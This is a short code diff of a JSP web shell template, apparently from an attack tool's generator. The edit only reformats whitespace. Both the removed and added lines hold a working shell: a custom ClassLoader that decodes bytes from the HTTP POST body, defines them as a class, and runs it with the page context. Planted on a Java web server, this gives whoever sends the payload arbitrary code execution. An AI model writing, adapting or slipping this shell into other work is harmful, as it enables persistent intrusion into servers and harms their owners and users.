@@ -2,9 +2,8 @@
 <%%!
 %s
 %%>
-    <%%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
-        super.defineClass(b,0,b.length);}}%%>
-        <%%if (request.getMethod().equals("POST")){
+<%%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
+        super.defineClass(b,0,b.length);}}%%><%%if (request.getMethod().equals("POST")){
             ByteArrayOutputStream bos = new ByteArrayOutputStream();
             byte[] buf = new byte[512];
             int length=request.getInputStream().read(buf);
@@ -15,4 +14,4 @@
                 length=request.getInputStream().read(buf);
             }
         new U(this.getClass().getClassLoader()).g(%s(bos.toByteArray())).newInstance().equals(pageContext);}
-    %%>
+%%>
